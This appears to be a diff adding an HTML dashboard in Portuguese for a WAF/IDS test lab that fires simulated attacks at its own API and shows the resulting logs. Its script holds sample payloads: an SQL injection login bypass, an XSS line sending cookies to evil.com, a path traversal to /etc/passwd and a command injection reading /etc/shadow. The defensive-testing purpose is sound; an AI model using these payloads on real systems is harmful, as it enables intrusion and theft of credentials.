@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>S.I.M. - Monitoramento Forense</title>
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg-base: #0f172a;    
+            --bg-panel: #1e293b;     
+            --border-color: #334155;
+            --text-main: #cbd5e1;
+            --text-muted: #94a3b8;
+            --accent-blue: #38bdf8;
+        }
+
+        body {
+            background-color: var(--bg-base);
+            color: var(--text-main);
+            font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 0.9rem;
+        }
+
+        .topbar {
+            background-color: var(--bg-panel);
+            border-bottom: 1px solid var(--border-color);
+            padding: 0.75rem 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .brand {
+            font-weight: 600;
+            color: #f8fafc;
+            letter-spacing: 0.5px;
+            font-size: 1rem;
+        }
+        .brand-prefix {
+            color: var(--accent-blue);
+            margin-right: 5px;
+        }
+
+        .status-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: var(--text-muted);
+            background: rgba(34, 197, 94, 0.1);
+            padding: 4px 12px;
+            border-radius: 12px;
+            border: 1px solid rgba(34, 197, 94, 0.2);
+        }
+        .pulse-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: #22c55e;
+            box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(34, 197, 94, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); }
+        }
+
+        .panel {
+            background-color: var(--bg-panel);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+            height: 100%;
+        }
+        .panel-header {
+            padding: 0.85rem 1.25rem;
+            border-bottom: 1px solid var(--border-color);
+            font-weight: 600;
+            color: #f8fafc;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .panel-body {
+            padding: 1.25rem;
+        }
+
+        .form-label {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            margin-bottom: 0.25rem;
+            font-weight: 500;
+        }
+        .form-select, .form-control {
+            background-color: var(--bg-base);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            font-size: 0.85rem;
+            border-radius: 4px;
+        }
+        .form-select:focus, .form-control:focus {
+            background-color: var(--bg-base);
+            border-color: var(--accent-blue);
+            color: white;
+            box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2);
+        }
+        .btn-action {
+            background-color: #3b82f6;
+            color: white;
+            border: none;
+            font-size: 0.85rem;
+            font-weight: 500;
+            padding: 0.4rem 1rem;
+            border-radius: 4px;
+            transition: all 0.2s;
+        }
+        .btn-action:hover {
+            background-color: #2563eb;
+        }
+        .btn-refresh {
+            background-color: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-muted);
+            font-size: 0.75rem;
+            padding: 0.2rem 0.6rem;
+        }
+        .btn-refresh:hover {
+            background-color: var(--border-color);
+            color: white;
+        }
+
+        .table-container {
+            overflow-y: auto;
+            max-height: calc(100vh - 160px);
+        }
+        .table {
+            color: var(--text-main);
+            margin-bottom: 0;
+            font-size: 0.8rem;
+        }
+        .table thead th {
+            background-color: var(--bg-panel);
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-muted);
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-size: 0.7rem;
+            position: sticky;
+            top: 0;
+            z-index: 1;
+            padding: 0.75rem 1rem;
+        }
+        .table tbody td {
+            border-bottom: 1px solid var(--border-color);
+            padding: 0.75rem 1rem;
+            vertical-align: middle;
+        }
+        .table tbody tr:hover {
+            background-color: rgba(255, 255, 255, 0.02);
+        }
+
+        .data-mono {
+            font-family: 'Consolas', 'Menlo', monospace;
+            font-size: 0.75rem;
+        }
+        .hash-id {
+            color: var(--text-muted);
+        }
+        .ip-address {
+            color: var(--accent-blue);
+        }
+        
+        .severity-badge {
+            display: inline-block;
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .sev-critica { background: rgba(220, 38, 38, 0.15); color: #f87171; border: 1px solid rgba(220, 38, 38, 0.3); }
+        .sev-alta { background: rgba(234, 88, 12, 0.15); color: #fb923c; border: 1px solid rgba(234, 88, 12, 0.3); }
+        .sev-media { background: rgba(202, 138, 4, 0.15); color: #facc15; border: 1px solid rgba(202, 138, 4, 0.3); }
+
+        .method-badge {
+            font-size: 0.7rem;
+            padding: 2px 6px;
+            border-radius: 3px;
+            background: #334155;
+            color: #cbd5e1;
+            margin-right: 6px;
+            font-weight: 600;
+        }
+
+        .payload-box {
+            background-color: #020617;
+            color: #a78bfa;
+            border: 1px solid #1e293b;
+            padding: 0.3rem 0.5rem;
+            border-radius: 4px;
+            white-space: nowrap;
+            overflow-x: auto;
+            max-width: 250px;
+        }
+        .payload-box::-webkit-scrollbar {
+            height: 4px;
+        }
+        .payload-box::-webkit-scrollbar-thumb {
+            background-color: #334155;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="topbar">
+        <div class="brand">
+            <span class="brand-prefix">PCISC</span> 
+            SISTEMA DE INTELIGÊNCIA E MONITORAMENTO
+        </div>
+        <div class="status-container">
+            <div class="pulse-dot"></div>
+            CAPTURA ATIVA
+        </div>
+    </header>
+
+    <div class="container-fluid mt-4 px-4 pb-4">
+        <div class="row g-4">
+            
+            <div class="col-lg-3 col-md-4">
+                <div class="panel">
+                    <div class="panel-header">
+                        Módulo de Simulação de Ameaças
+                    </div>
+                    <div class="panel-body">
+                        <p class="text-muted" style="font-size: 0.8rem; margin-bottom: 1.5rem;">
+                            Dispare requisições anômalas controladas para auditar a capacidade de resposta e catalogação do motor WAF/IDS local.
+                        </p>
+                        
+                        <form onsubmit="dispararAtaque(event)">
+                            <div class="mb-4">
+                                <label class="form-label">Vetor de Ataque a Simular</label>
+                                <select class="form-select" id="tipoAtaque">
+                                    <option value="sqli">Bypass de Autenticação (SQLi)</option>
+                                    <option value="xss">Injeção de Script (XSS)</option>
+                                    <option value="lfi">Leitura de Arquivos (LFI)</option>
+                                    <option value="rce">Execução Remota (RCE)</option>
+                                    <option value="scan">Reconhecimento (Nmap Scan)</option>
+                                </select>
+                            </div>
+                            <button type="submit" class="btn-action w-100">Executar Teste</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-lg-9 col-md-8">
+                <div class="panel">
+                    <div class="panel-header">
+                        Logs de Interceptação WAF/IDS
+                        <button class="btn btn-refresh" onclick="carregarLogs()">Atualizar Dados</button>
+                    </div>
+                    <div class="table-container">
+                        <table class="table">
+                            <thead>
+                                <tr>
+                                    <th>Ref. Evidência</th>
+                                    <th>Data / Hora</th>
+                                    <th>IP de Origem</th>
+                                    <th>Alvo Solicitado</th>
+                                    <th>Assinatura Identificada</th>
+                                    <th>Risco</th>
+                                    <th>Dados do Payload</th>
+                                </tr>
+                            </thead>
+                            <tbody id="tabelaLogs">
+                                </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        async function carregarLogs() {
+            try {
+                const res = await fetch('/api/forensic/logs');
+                const logs = await res.json();
+                const tbody = document.getElementById('tabelaLogs');
+                tbody.innerHTML = '';
+
+                if (logs.length === 0) {
+                    tbody.innerHTML = `
+                        <tr>
+                            <td colspan="7" class="text-center text-muted py-5" style="border-bottom:none;">
+                                <div class="opacity-50 mb-2">🛡️</div>
+                                Tráfego limpo. Nenhuma anomalia detectada no momento.
+                            </td>
+                        </tr>`;
+                    return;
+                }
+
+                logs.forEach(log => {
+                    // Gravidade
+                    let badgeClass = 'sev-media';
+                    if(log.gravidade === 'CRÍTICA') badgeClass = 'sev-critica';
+                    else if(log.gravidade === 'ALTA') badgeClass = 'sev-alta';
+
+                    // Formatação de data
+                    const dataFormatada = new Date(log.timestamp).toLocaleString('pt-BR', {
+                        day: '2-digit', month: '2-digit', year: 'numeric',
+                        hour: '2-digit', minute: '2-digit', second: '2-digit'
+                    });
+
+                    // Transforma o ID (timestamp) em Hexadecimal para parecer um Hash pericial
+                    const hashId = log.id.toString(16).toUpperCase();
+
+                    tbody.innerHTML += `
+                        <tr>
+                            <td class="data-mono hash-id">#${hashId}</td>
+                            <td>${dataFormatada}</td>
+                            <td class="data-mono ip-address">${log.ip}</td>
+                            <td class="data-mono">
+                                <span class="method-badge">${log.metodo}</span>
+                                ${log.alvo.split('?')[0]}
+                            </td>
+                            <td>${log.ameaca}</td>
+                            <td><span class="severity-badge ${badgeClass}">${log.gravidade}</span></td>
+                            <td>
+                                <div class="data-mono payload-box">${escapeHTML(log.payload)}</div>
+                            </td>
+                        </tr>
+                    `;
+                });
+            } catch (err) {
+                console.error('Falha de conexão:', err);
+            }
+        }
+
+        function escapeHTML(str) {
+            return str.replace(/[&<>'"]/g, 
+                tag => ({
+                    '&': '&amp;',
+                    '<': '&lt;',
+                    '>': '&gt;',
+                    "'": '&#39;',
+                    '"': '&quot;'
+                }[tag])
+            );
+        }
+
+        async function dispararAtaque(e) {
+            e.preventDefault();
+            const tipo = document.getElementById('tipoAtaque').value;
+            
+            let url = '/api/files';
+            let options = { method: 'GET', headers: {} };
+
+            switch(tipo) {
+                case 'sqli':
+                    url = '/api/auth';
+                    options.method = 'POST';
+                    options.headers['Content-Type'] = 'application/json';
+                    options.body = JSON.stringify({ user: "admin' OR 1=1 --", pass: "1234" });
+                    break;
+                case 'xss':
+                    url = '/api/files?search=<script>fetch("http://evil.com?cookie="+document.cookie)</' + 'script>';
+                    break;
+                case 'lfi':
+                    url = '/api/files?config=../../../../etc/passwd';
+                    break;
+                case 'rce':
+                    url = '/api/files?ping=127.0.0.1; cat /etc/shadow';
+                    break;
+                case 'scan':
+                    options.headers['User-Agent'] = 'Mozilla/5.0 (compatible; Nmap Scripting Engine)';
+                    break;
+            }
+
+            try {
+                await fetch(url, options);
+            } catch(e) {} 
+
+            setTimeout(carregarLogs, 200);
+        }
+
+        carregarLogs();
+        setInterval(carregarLogs, 3000); 
+    </script>
+</body>
+</html>
